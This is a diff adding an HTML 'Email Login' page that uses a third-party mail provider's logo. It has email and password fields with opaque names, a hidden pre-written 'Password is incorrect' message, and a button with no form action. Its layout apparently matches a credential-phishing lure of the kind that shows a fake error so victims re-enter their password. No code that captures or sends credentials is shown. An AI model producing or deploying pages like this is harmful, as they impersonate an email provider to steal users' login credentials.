@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Email Login</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-container {
+      text-align: center;
+      width: 100%;
+      max-width: 280px;
+    }
+    .logo {
+      width: 130px;
+      margin-bottom: 20px;
+    }
+    .input-group {
+      display: flex;
+      align-items: center;
+      border: 1px solid #ccc;
+      background-color: #f1f4f6;
+      margin-bottom: 12px;
+      border-radius: 4px;
+      overflow: hidden;
+    }
+    .input-group i {
+      padding: 10px;
+      background: #f1f4f6;
+      color: #333;
+    }
+    .input-group input {
+      border: none;
+      outline: none;
+      padding: 10px;
+      flex: 1;
+      font-size: 16px;
+      background: #f1f4f6;
+    }
+    .login-button {
+      width: 100%;
+      background: #000;
+      color: #fff;
+      padding: 12px;
+      font-size: 16px;
+      border: none;
+      cursor: pointer;
+      margin-bottom: 10px;
+    }
+    .spacer {
+      height: 30px;
+      background: #f1f4f6;
+    }
+    .error-message {
+      color: red;
+      font-size: 14px;
+      margin-top: -10px;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <img src="https://serviciodecorreo.es/images/brand/logo.svg?s=1748943060" class="logo" alt="Logo">
+    <div class="input-group">
+      <i class="fa fa-user"></i>
+      <input value="" id="a" name="a" placeholder="Email account">
+    </div>
+    <div class="input-group">
+      <i class="fa fa-lock"></i>
+      <input type="password" name="az" id="az" placeholder="Password">
+    </div>
+    
+	<div id="msg" style="margin-bottom:25px; display:none; color:#ff1505;">Password is incorrect. Please try again</div>
+	<div id="error" style="margin-bottom:25px; display:none; color:#ff1505;"> </div>
+		  
+    <button class="login-button" id="submit-btn">EMAIL LOGIN</button>
+    <div class="spacer"></div>
+  </div>
+
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+
+  
+</body>
+</html>
